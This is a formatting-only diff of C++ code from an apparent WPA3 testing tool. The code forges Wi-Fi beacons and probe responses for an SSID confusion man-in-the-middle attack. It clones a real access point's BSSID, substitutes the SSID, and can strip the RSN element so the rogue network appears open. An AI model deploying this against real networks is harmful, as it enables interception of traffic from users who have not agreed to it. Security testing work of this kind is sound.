@@ -6,7 +6,7 @@ namespace wpa3_tester {
 using namespace Tins;
 using namespace std;
 
-Dot11Beacon make_confused_beacon(const Dot11Beacon &real, const string &confused_ssid, const bool strip_rsn){
+Dot11Beacon make_confused_beacon(const Dot11Beacon &real, const string &confused_ssid, const bool strip_rsn) {
 	// BSSID kept identical to real AP
 	auto b = Dot11Beacon(real.addr1(), real.addr2());
 	b.addr3(real.addr3());
@@ -14,36 +14,36 @@ Dot11Beacon make_confused_beacon(const Dot11Beacon &real, const string &confused
 	b.interval(real.interval());
 	b.capabilities() = real.capabilities();
 
-	for(const auto &opt: real.options()){
-		if(opt.option() == Dot11::SSID){
-			b.add_option({Dot11::SSID,
-				static_cast<uint8_t>(confused_ssid.size()),
-				reinterpret_cast<const uint8_t*>(confused_ssid.data())});
-		} else if(strip_rsn && opt.option() == Dot11::RSN){
+	for(const auto &opt: real.options()) {
+		if(opt.option() == Dot11::SSID) {
+			b.add_option({ Dot11::SSID,
+					static_cast<uint8_t>(confused_ssid.size()),
+					reinterpret_cast<const uint8_t *>(confused_ssid.data()) });
+		} else if(strip_rsn && opt.option() == Dot11::RSN) {
 			continue; // drop RSN IE - rogue beacon appears as an open network
-		} else{
+		} else {
 			b.add_option(opt);
 		}
 	}
 	return b;
 }
 
-Dot11ProbeResponse make_confused_probe_resp(const Dot11ProbeResponse &real, const string &confused_ssid,
-											const bool strip_rsn){
+Dot11ProbeResponse make_confused_probe_resp(
+		const Dot11ProbeResponse &real, const string &confused_ssid, const bool strip_rsn) {
 	auto resp = Dot11ProbeResponse(real.addr1(), real.addr2());
 	resp.addr3(real.addr3());
 	resp.timestamp(real.timestamp());
 	resp.interval(real.interval());
 	resp.capabilities() = real.capabilities();
 
-	for(const auto &opt: real.options()){
-		if(opt.option() == Dot11::SSID){
-			resp.add_option({Dot11::SSID,
-				static_cast<uint8_t>(confused_ssid.size()),
-				reinterpret_cast<const uint8_t*>(confused_ssid.data())});
-		} else if(strip_rsn && opt.option() == Dot11::RSN){
+	for(const auto &opt: real.options()) {
+		if(opt.option() == Dot11::SSID) {
+			resp.add_option({ Dot11::SSID,
+					static_cast<uint8_t>(confused_ssid.size()),
+					reinterpret_cast<const uint8_t *>(confused_ssid.data()) });
+		} else if(strip_rsn && opt.option() == Dot11::RSN) {
 			continue;
-		} else{
+		} else {
 			resp.add_option(opt);
 		}
 	}
@@ -65,12 +65,11 @@ bool SsidConfusionHooks::send_periodic_beacon(McMitm &m) {
 	return false; // still send CSA switch beacon on real
 }
 
-bool SsidConfusionHooks::on_assoc_request(McMitm &m, Dot11 &dot11,
-										  HWAddress<6>) {
+bool SsidConfusionHooks::on_assoc_request(McMitm &m, Dot11 &dot11, HWAddress<6>) {
 	return false;
 	//FIXME
 	const auto *assoc = dot11.find_pdu<Dot11AssocRequest>();
-	if (!assoc) return false;
+	if(!assoc) return false;
 
 	auto out = make_real_ssid_assoc_req(*assoc, real_ssid_);
 	out.addr1(m.ap.get(SK::mac));
